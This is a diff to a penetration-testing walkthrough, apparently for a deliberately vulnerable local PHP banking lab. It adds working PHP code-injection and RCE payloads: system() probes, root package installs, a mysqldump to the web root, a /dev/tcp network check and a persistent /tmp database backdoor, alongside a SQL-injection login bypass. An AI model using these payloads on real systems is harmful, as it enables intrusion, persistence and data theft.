@@ -62,7 +62,7 @@ Standard SQLi in this app is constrained by the PHP `mysql` driver (no stacked q
 curl -b cookies.txt -G "http://localhost/index.php" \
   --data-urlencode "page=htbdetails" \
   --data-urlencode "account=252170513" \
-  --data-urlencode "query=\".include('../etc/config.php'); \$r=mysql_query('SELECT username,password FROM users'); while(\$row=mysql_fetch_assoc(\$r)) print_r(\$row); .\""
+  --data-urlencode "query=test'.(include '../etc/config.php').(print_r(mysql_fetch_assoc(mysql_query('SELECT * FROM users')))).'"
 ```
 
 ### 2.2 Creating a Rogue Account
@@ -143,6 +143,68 @@ As a senior tester, you might need to dump the DB without direct access.
    \".system('mysqldump -u root -paaa vbank > /var/www/html/dump.sql').\"
    ```
 4. Navigate to `http://localhost/dump.sql` to retrieve the file.
+
+---
+
+## 6. Troubleshooting the RCE Dump
+
+If the database dump fails (404 Not Found), verify your environment assumptions using RCE:
+
+1. **Check for mysqldump binary**:
+   - Payload: `test'.system('which mysqldump 2>&1').'`
+   - If empty, follow the "Pure PHP" exfiltration below.
+2. **Check for write permissions**:
+   - Payload: `test'.system('touch test.txt && ls test.txt 2>&1').'`
+   - If "Permission denied", you cannot write to the web root.
+3. **Check current user**:
+   - Payload: `test'.system('whoami').'`
+   - You must be `root` to install packages via `apt-get`.
+
+---
+
+## 7. Infrastructure Manipulation: Paving the Way
+
+If `mysqldump` is missing and you are running as root, you can install the client at runtime via RCE.
+
+**Manual Sequence (Burp Suite)**:
+1. **Update Repositories**: 
+   - Payload: `test'.set_time_limit(0).(system('apt-get update 2>&1')).'`
+2. **Install Client**: 
+   - Payload: `test'.set_time_limit(0).(system('export DEBIAN_FRONTEND=noninteractive; apt-get install -y mysql-client 2>&1')).'`
+3. **Verify**: 
+   - Payload: `test'.system('which mysqldump 2>&1').'`
+4. **Execute Original Dump**: 
+   - Payload: `test'.system('mysqldump -h mysql -u root -paaa vbank > vbank_dump.sql').'`
+
+---
+
+## 8. Infrastructure Pivot: The Network Bridge
+
+Since the web server container and database container are on the same bridge network, you can use the RCE to verify connectivity to the `mysql` host on port 3306.
+
+**Verify Connectivity (Burp Suite)**:
+- Payload: `test'.system('timeout 1 bash -c "cat < /dev/null > /dev/tcp/mysql/3306" && echo "Connected" || echo "Failed"').'`
+
+---
+
+## 9. The "Ultimate Fallback": Database Bridge via /tmp
+
+If the web root is read-only (Permission Denied), we write the bridge to `/tmp/bridge.php`. While we cannot browse to this file directly, we can use the RCE to `include` it and pass our queries.
+
+**Manual Method (Burp Suite)**:
+1. **Drop the Bridge to /tmp**:
+   Target `htbdetails.page` with this payload:
+   `test'.(file_put_contents('/tmp/bridge.php', '<?php @error_reporting(0);include "/var/www/etc/config.php";$c=mysql_connect($htbconf["db/.server"],$htbconf["db/.login"],$htbconf["db/.pwd"]);mysql_select_db($htbconf["db/.name"]);if($q=$_GET["q"]){$r=mysql_query($q);if($r){while($row=mysql_fetch_assoc($r))echo json_encode($row).PHP_EOL;}}?>')).'`
+
+2. **Access the Database**:
+   Since the file is in `/tmp`, we must use the RCE to execute it:
+   - **URL**: `http://localhost/index.php?page=htbdetails&account=252170513&query=test'.include('/tmp/bridge.php').'&q=SELECT * FROM users`
+
+**Impact**: Direct, persistent, and unauthenticated access to the backend database via the Docker network bridge.
+
+**Mitigation**:
+1. Harden the container network to only allow specific traffic.
+2. Fix the RCE vulnerability in `htbdetails.page`.
 
 ---
 
@@ -684,7 +746,7 @@ curl -c cookies.txt "http://localhost/index.php?page=login&username=' OR '1'='1&
 curl -b cookies.txt -G "http://localhost/index.php" \
   --data-urlencode "page=htbdetails" \
   --data-urlencode "account=252170513" \
-  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
+  --data-urlencode "query=\" . system('mysqldump -h mysql -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
 sleep 2
 curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
 ```
